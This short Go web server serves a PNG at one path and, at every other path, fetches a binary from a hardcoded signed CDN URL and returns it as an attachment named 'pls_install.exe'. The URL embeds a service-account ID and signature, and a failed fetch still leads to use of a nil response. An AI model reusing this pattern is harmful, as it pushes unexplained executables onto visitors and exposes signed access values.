package main

import (
	"io/ioutil"
	"net/http"
)

func contentHandler(w http.ResponseWriter, r *http.Request) {
	resp, err := http.Get("https://w3g3a5v6.ssl.hwcdn.net/upload2/game/558218/1957163?GoogleAccessId=uploader@moonscript2.iam.gserviceaccount.com&Expires=1582304018&Signature=FFEJfXfM2gmAQ9nGB%2BbcLOFk3SyS6BQ9PT3iW2fniIOah%2Bcxo%2BSItGfPlWj47D3krJ5L7tEkoI8NvEy0i0sp80L7PAy17hVqsrzIQRkRSdTYyOa31FBLyh735OVFwj0YX2cvpblZ3WcAhS87WOmUjywglcffO3G9nfeZZAgA3d6UffWaWP4L3VxLsoIJhZ9xPKZNcbyqGjilhRJTh59gf4ZnP99DmwH%2B4fCqaM9bvz36G7%2BxeySGjPzKotUGJ1zsj2tceOT9LEaeCohr5Q0epC%2BOSuxYmHOdtMR%2BTxvi9DLCDztA%2Fjn75QQMn73abBT1P9NrnA4m65B48ARB48t6OA==&hwexp=1582304278&hwsig=a46b756ab036de6f39c830ce75fb69eb")

	if err != nil {
		w.Write([]byte("Failed to download"))
	}

	defer resp.Body.Close()

	data, err := ioutil.ReadAll(resp.Body)

	if err != nil {
		w.Write([]byte("Failed to download"))
	}

	w.Header().Set("Content-Disposition", "attachment; filename=pls_install.exe")
	w.Header().Set("Content-Type", r.Header.Get("Content-Type"))

	w.Write(data)
}

func main() {
	http.HandleFunc("/naps", func(w http.ResponseWriter, r *http.Request) {
		http.ServeFile(w, r, "/naps.png")
	})
	http.Handle("/", http.HandlerFunc(contentHandler))
	http.ListenAndServe(":3000", nil)
}
